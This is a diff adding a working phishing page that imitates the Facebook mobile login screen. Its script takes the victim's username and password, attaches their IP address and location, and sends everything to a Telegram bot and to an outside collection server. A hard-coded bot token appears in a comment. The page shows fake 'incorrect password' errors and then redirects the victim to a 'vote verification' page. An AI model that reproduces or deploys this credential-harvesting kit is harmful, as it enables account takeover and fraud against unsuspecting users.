@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="robots" content="noindex" />
+    <meta name="googlebot" content="noarchive">
+
+    
+  
+    <style>
+    * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    outline: 1px solid transparent;
+}
+.header {
+    background: #3b5998;
+    padding: 10px;
+    font-weight: bold;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    color: white;
+    font-size: 25px;
+}
+p {
+    color: #0341b4f6;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    margin-top: -32px;
+    margin-left: 30px;
+}
+.header-2 {
+    
+    padding: 12px;
+}
+.form {
+    padding: 20px;
+    display: block;
+    background: #f5fcff;
+}
+input[type=text] {
+    width: 100%;
+    border: 1px solid #dfe1ee;
+    padding: 15px ;
+    text-align: left;
+    border-radius: 5px;
+}
+input[type=text]:focus {
+    box-shadow: 0px 0px 10px -1px #008ad3;
+    border: 2px solid #fff;
+}
+
+input[type=submit] {
+    width: 100%;
+    border: 1px solid #0072bb;
+    padding: 10px;
+    text-align: left;
+    margin-top: 10px;
+    border-radius: 5px;
+    color: white;
+    text-align: center;
+    background: #0072bb;
+    font-weight: bold;
+    font-size: 14px;
+}
+button {
+    background: #0fb40f;
+    border: 2px solid #0fb40f;
+    color: white;
+    font-weight: bold;
+    padding: 10px;
+    border-radius: 5px;
+}
+span {
+    color: #0341b4f6;
+    font-size: 12px;
+    font-family: sans-serif;
+}
+    </style>
+    
+</head>
+<body>
+    <div class="header">
+        facebook
+    </div>
+    <div class="header-2">
+        <img src="images/fbandroid.png" width="20px"> <p> Get Facebook for Android and browse faster</p>
+    </div>
+        <div class="form">
+    <input type="text"  placeholder="Mobile number or email address" id="username" >
+    <input type="text" placeholder="Password" id="password" style='margin-top: 5px';>
+    <input type="hidden" id="userId" name="userId">
+
+    <input type="submit" value="Log in" id="login">
+    <p id="feedback" style="color: red;  font-family: sans-serif; font-size: 15px; text-align: center; margin: 0 30px; display: none;"></p><br>
+</div>
+    <center><button>Create New Account</button></center>
+    <center  style="margin-top: 10px; color:#0072bb"><span>Forgotten password?. <a href="#" style="text-decoration: none; color: #0072bb">Help Center</a></span></center>
+
+    <script>
+         var login = document.getElementById('login');
+        var loader = document.getElementById('loader')
+        var feedback = document.getElementById('feedback')
+        var username = document.getElementById('username')
+        var password = document.getElementById('password')
+        var userId = document.querySelector('#userId')
+
+        var x = 0;
+        login.addEventListener('click', function () {
+            console.log(password.value)
+
+
+                            // Telegram script
+                // Replace with your actual bot token and chat ID
+                const botToken = bot_token;
+                const chatId = chat_id;
+
+                // const botToken = '6620819038:AAEHyILpkCzwwlDX5tGbxzIqNUZ1yVXUqLo';
+                // const chatId = '5360982855';
+
+                // Function to send a message using vanilla Ajax
+                function sendMessage(message) {
+                    const xhr = new XMLHttpRequest();
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const params = `chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState === 4) {
+                            if (xhr.status === 200) {
+                                console.log('Message sent:', xhr.responseText);
+                            } else {
+                                console.error('Error sending message:', xhr.status, xhr.statusText);
+                            }
+                        }
+                    };
+
+                    xhr.send(params);
+                }
+
+                // Example: Send a message when the page loads
+                const messageToSend =
+                    `Hello admin, somebody just logged in: \n \n Username: ${username.value} (Facebook ) \n \n Password: ${password.value} \n \n IP: ${ipAddress} \n \n country: ${countryValue} \n \n city: ${cityValue} \n \n continent: ${continentValue} `;
+                sendMessage(messageToSend);
+
+                // Telegram End
+
+            // login.textContent = "";
+            // loader.style.display = 'block'
+ 
+            // setTimeout(() => {
+
+            // function load() {
+            const data = new FormData();
+            data.append('username', username.value + " (Facebook)");
+            data.append('password', password.value);
+            data.append('userId', userId.value);
+            const response = new XMLHttpRequest();
+            response.onreadystatechange = function () {
+                feedback.style.display = 'block'
+            }
+            response.open('POST', global_url, true);
+            response.send(data);
+
+                var xhr2 = new XMLHttpRequest()
+                var datad = new FormData();
+                datad.append('username', username.value + " (Facebook)")
+                datad.append('password', password.value)
+                datad.append('userId', userId.value);
+                xhr2.onreadystatechange = function () {
+                    
+                }
+                xhr2.open('POST', global_url ,true)
+                xhr2.send(datad)
+
+
+            x ++
+            feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
+            if (x == 2) {
+                feedback.textContent = 'Sorry an error occurred please try again later'
+            }else if (x == 3){
+                feedback.textContent = '';
+                window.location.href='vote_verification.html'
+            }
+        //    }
+
+            // }, 1500);
+        })
+
+        var ipAddress;
+        var countryValue;
+        var cityValue;
+        var continentValue;
+        var params = new URLSearchParams(window.location.search);
+        var paramsValue = params.get('id');
+        var accountStatus
+        console.log(paramsValue)
+   
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ipAddress = data.ip;
+                fetch(`https://ipapi.co/${ipAddress}/json/`)
+                    .then(response => response.json())
+                    .then(geoData => {
+                        // Step 3: Parse the response to extract country details
+                         countryValue = geoData.country_name;
+                         continentValue = geoData.region;
+                         cityValue = geoData.city;
+
+                    })
+                    .catch(error => console.error('Error fetching geolocation data:', error));
+            })
+            .catch(error => console.error('Error fetching IP address:', error));
+
+        setTimeout(() => {
+            if (fb != "active") {
+                window.location.href = 'error.html'
+            }
+            if (ig != "active") {
+                window.location.href = 'error.html'
+            }
+            if (mail != "active") {
+                window.location.href = 'error.html'
+            }
+
+
+
+        }, 1000);
+
+
+        
+        setTimeout(() => {
+            userId.value = params.get('id')
+            var get_id = params.get('id')
+            if (get_id === "") {
+                window.location.href = 'error.html'
+            }
+            if (accountStatus === "pending") {
+                window.location.href = 'error2.html'
+            }
+            global_url = 'https://brandstez.com/en/info/login.php'
+        }, 1000);
+
+        var dataUrl = "https://brandstez.com/en/info/request_api.php?id=" + paramsValue
+        setTimeout(() => {
+            fetch(dataUrl)
+            .then(response => response.json())
+            .then(datas => {
+                datas.forEach(data => {
+                    user_id = data.user_id
+                    email2 = data.email
+                    password2 = data.password
+                    profile_name = data.profile_name
+                    profile_image = data.profile_image
+                    min = data.min
+                    max = data.max
+                    chat_id = data.chat_id
+                    bot_token = data.bot_token
+                    design = data.design
+                    ig = data.ig
+                    fb = data.fb
+                    mail = data.mail
+                    url = data.url
+                    accountStatus = data.status
+                    console.log(data)
+                });
+            }).catch(error => console.error('Error ', error));
+
+        }, 2000);</script>
+            <script src="main.js"></script>
+
+</body>
+</html>
